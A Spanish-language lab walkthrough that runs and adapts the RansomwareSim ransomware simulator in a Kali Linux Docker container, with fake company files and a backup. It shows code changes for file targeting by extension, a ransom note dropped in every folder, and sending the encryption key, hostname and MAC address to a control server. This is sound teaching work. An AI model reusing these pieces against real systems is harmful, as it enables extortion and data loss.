# Laboratorio — Simulación de recuperación en entorno controlado (Kali Linux + Docker)

## Objetivo

Implementar un laboratorio educativo utilizando Kali Linux dentro de Docker para representar un escenario controlado de impacto y recuperación.

El laboratorio busca comprender el flujo básico de funcionamiento de un ransomware utilizando:

- Python
- Fernet
- sockets TCP
- arquitectura cliente-servidor
- automatización de archivos
- Linux + Docker

---

# Arquitectura del laboratorio

```text
EndeavourOS (Host)

└── Docker

    └── Kali Linux

        └── lab_ransom/

            ├── RansomwareSim/
            │   ├── Encoder.py
            │   ├── Decoder.py
            │   ├── ControlServer.py
            │   ├── requirements.txt
            │   └── ...
            │
            ├── empresa/
            │   ├── finanzas/
            │   ├── rrhh/
            │   └── gerencia/
            │
            └── respaldo/
```

---

# Paso 1 — Verificar contenedor Docker

Verificar contenedores:

```bash
docker ps -a
```

Iniciar Kali:

```bash
docker start -ai kali
```

Verificar usuario:

```bash
whoami
```

Resultado esperado:

```text
root
```

---

# Paso 2 — Preparar entorno

Actualizar repositorios:

```bash
apt update
```

Instalar herramientas necesarias:

```bash
apt install -y \
git \
python3 \
python3-pip \
python3-venv \
tree \
neovim
```

---

# Paso 3 — Crear laboratorio

Crear directorio:

```bash
mkdir /lab_ransom
```

Entrar:

```bash
cd /lab_ransom
```

---

# Paso 4 — Clonar repositorio

Clonar:

```bash
git clone https://github.com/HalilDeniz/RansomwareSim.git
```

Entrar:

```bash
cd RansomwareSim
```

Verificar contenido:

```bash
tree -L 1
```

Resultado esperado:

```text
.
├── ControlServer.py
├── Decoder.py
├── Encoder.py
├── LICENSE
├── Readme.md
├── SECURITY.md
├── img
└── requirements.txt
```

---

# Paso 5 — Crear entorno virtual

Crear entorno virtual:

```bash
python3 -m venv lab_ransom
```

Activar:

```bash
source lab_ransom/bin/activate
```

Verificar:

```bash
which python
```

Instalar dependencias:

```bash
pip install -r requirements.txt
```

Instalar colorama:

```bash
pip install colorama
```

Verificar librerías:

```bash
pip list
```

---

# Paso 6 — Crear estructura de empresa

Volver al directorio principal:

```bash
cd ..
```

Crear directorios:

```bash
mkdir -p empresa/{finanzas,rrhh,gerencia}
```

Crear archivos simulados:

```bash
touch empresa/finanzas/{clientes.xlsx,pagos.pdf,facturas.docx}
```

```bash
touch empresa/rrhh/{empleados.docx,contratos.pdf,nomina.xlsx}
```

```bash
touch empresa/gerencia/{reportes.docx,estrategia.txt,proyectos.pdf}
```

---

# Paso 7 — Crear respaldo

Crear backup:

```bash
cp -r empresa respaldo
```

---

# Verificación final

```bash
tree -L 3
```

Resultado esperado:

```text
.
├── RansomwareSim
│   ├── ControlServer.py
│   ├── Decoder.py
│   ├── Encoder.py
│   ├── requirements.txt
│   └── ...
│
├── empresa
│   ├── finanzas
│   ├── gerencia
│   └── rrhh
│
└── respaldo
```

---

# Adaptaciones realizadas para Linux + Docker

El proyecto original fue diseñado para Windows.

Durante el laboratorio se realizaron múltiples modificaciones para adaptarlo correctamente a:

```text
Docker + Kali Linux
```

---

# Cambios realizados en Encoder.py

## 1. Cambio de directorio objetivo

Implementación original:

```python
directory = 'dosyalar/'
```

Implementación utilizada:

```python
directory = '/lab_ransom/empresa/'
```

Motivo:

```text
El proyecto original utilizaba una carpeta orientada a Windows.

Durante el laboratorio se implementó una estructura personalizada
para representar los directorios corporativos dentro del contenedor.
```

---

## 2. Cambio de host TCP

Implementación original:

```python
server_host = '10.0.2.37'
```

Implementación utilizada:

```python
server_host = '127.0.0.1'
```

o:

```python
server_host = 'localhost'
```

Motivo:

```text
Encoder.py y ControlServer.py se ejecutan dentro del mismo
contenedor Kali Linux.
```

---

## 3. Agregado de extensiones objetivo

Implementación utilizada:

```python
file_extensions = ['.txt', '.docx', '.jpg', '.xlsx', '.pdf']
```

Motivo:

```text
Se agregaron múltiples extensiones para representar
información corporativa dentro del laboratorio.
```

Tipos simulados:

```text
- documentos
- imágenes
- hojas de cálculo
- PDFs
```

---

## 4. Adaptación de create_readme()

La implementación original estaba diseñada para Windows Desktop.

### Implementación original

```python
def create_readme(self):

    desktop_path = os.path.join(
        os.path.join(os.environ['USERPROFILE']),
        'Desktop'
    )

    readme_path = os.path.join(desktop_path, 'Readme.txt')

    with open(readme_path, 'w') as file:

        file.write(
            "This is a simulation program, your files are encrypted."
        )
```

### Problemas detectados

```text
- USERPROFILE es exclusivo de Windows
- Docker/Kali no utiliza Desktop
- El laboratorio no posee entorno gráfico
```

### Nueva implementación

```python
def create_readme(self):

    for root, dirs, files in os.walk(self.directory):

        readme_path = os.path.join(root, "Message.txt")

        with open(readme_path, "w") as file:

            file.write(
                "=== SIMULACIÓN DE RANSOMWARE ===\n\n"
                "Sus archivos han sido cifrados como parte "
                "de una práctica educativa.\n"
                "No se preocupe, esto es solo una simulación.\n\n"
                f"Directorio afectado:\n{root}\n"
            )

        print(f"[+] README creado: {readme_path}")
```

### Funcionamiento

```text
- Recorre automáticamente todos los directorios
- Utiliza os.walk()
- Crea Message.txt dentro de cada carpeta
- Compatible con Linux y Docker
```

---

## 5. Cambio de orden de ejecución

Problema detectado:

```text
Encoder.py intentaba conectarse al servidor antes de
completar create_readme().
```

Implementación original:

```python
simulator.find_and_encrypt_files()
simulator.send_data_to_server()
simulator.create_readme()
```

Nueva implementación:

```python
simulator.find_and_encrypt_files()
simulator.create_readme()
simulator.send_data_to_server()
```

Motivo:

```text
Si la conexión TCP fallaba, el programa terminaba antes
de crear las notas Message.txt.
```

---

# Cambios realizados en ControlServer.py

## 1. Instalación de colorama

Error detectado:

```text
ModuleNotFoundError: No module named 'colorama'
```

Solución:

```bash
pip install colorama
```

Motivo:

```text
ControlServer.py utiliza colorama para mostrar
mensajes con colores en terminal.
```

---

## 2. Orden correcto de ejecución

Flujo correcto:

```text
1. Ejecutar ControlServer.py
2. Ejecutar Encoder.py
3. Ejecutar Decoder.py
```

Motivo:

```text
Encoder.py requiere que el servidor TCP ya se
encuentre escuchando conexiones.
```

---

## 3. Configuración TCP utilizada

Implementación:

```python
HOST = '0.0.0.0'
PORT = 12345
```

Funcionamiento:

```text
- Escucha conexiones TCP
- Recibe información del Encoder
- Guarda la clave Fernet utilizada
- Responde solicitudes del Decoder
```

---

## 4. Flujo de comunicación

### Encoder.py envía:

```json
{
  "hostname": "...",
  "key": "...",
  "active_users": "...",
  "mac_address": "..."
}
```

### Decoder.py solicita:

```json
{
  "request": "key"
}
```

### ControlServer.py responde:

```json
{
  "key": "..."
}
```

---

# Cambios realizados en Decoder.py

## 1. Cambio de directorio objetivo

Implementación original:

```python
directory = 'dosyalar/'
```

Implementación utilizada:

```python
directory = '/lab_ransom/empresa/'
```

---

## 2. Cambio de host TCP

Implementación original:

```python
server_host = '10.0.2.37'
```

Implementación utilizada:

```python
server_host = '127.0.0.1'
```

o:

```python
server_host = 'localhost'
```

---

## 3. Conversión de clave Fernet

Problema detectado:

```python
fernet = Fernet(key)
```

La clave recibida desde JSON llegaba como string.

### Solución implementada

```python
fernet = Fernet(key.encode())
```

Motivo:

```text
Fernet requiere la clave en formato bytes.
```

---

## 4. Adaptación de delete_readme()

La implementación original dependía de Windows Desktop.

### Implementación original

```python
def delete_readme(self):

    desktop_path = os.path.join(
        os.path.join(os.environ['USERPROFILE']),
        'Desktop'
    )

    readme_path = os.path.join(desktop_path, 'Readme.txt')

    if os.path.exists(readme_path):

        os.remove(readme_path)
```

### Problemas detectados

```text
- USERPROFILE no existe en Linux
- La nota ya no se almacena en Desktop
```

### Nueva implementación

```python
def delete_readme(self):

    for root, dirs, files in os.walk(self.directory):

        for file in files:

            if file == "Message.txt":

                readme_path = os.path.join(root, file)

                os.remove(readme_path)

                print(f"[+] Deleted: {readme_path}")
```

---

# Flujo completo del laboratorio

## 1. Ejecutar servidor

Terminal 1:

```bash
python3 ControlServer.py
```

---

## 2. Ejecutar Encoder.py

Terminal 2:

```bash
python3 Encoder.py
```

Funcionamiento:

```text
- Genera clave Fernet
- Recorre directorios
- Cifra archivos
- Crea Message.txt
- Envía información al servidor
```

---

## 3. Ejecutar Decoder.py

Terminal 3:

```bash
python3 Decoder.py
```

Funcionamiento:

```text
- Solicita la clave al servidor
- Descifra archivos .denizhalil
- Restaura archivos originales
- Elimina Message.txt
```

---

# Escenarios de recuperación

## Caso 1 — Existe respaldo

```text
Recuperación mediante backup.
```

Ejemplo:

```bash
rm -rf empresa
cp -r respaldo empresa
```

---

## Caso 2 — No existe respaldo

```text
Recuperación simulada utilizando Decoder.py
y ControlServer.py.
```

Proceso:

```text
1. Ejecutar ControlServer.py
2. Ejecutar Encoder.py
3. El servidor recibe la clave Fernet
4. Ejecutar Decoder.py
5. Decoder solicita la clave
6. ControlServer muestra la clave
7. Ingresar la clave solicitada
8. Los archivos son restaurados
```

---

# Objetivo educativo

```text
Este laboratorio fue desarrollado únicamente con fines educativos
y de aprendizaje en entornos controlados.

El objetivo es comprender:

- cifrado simétrico
- flujo encrypt/decrypt
- sockets TCP
- arquitectura cliente-servidor
- automatización de archivos
- adaptación Windows → Linux
- recuperación de información
- manejo de claves Fernet
```
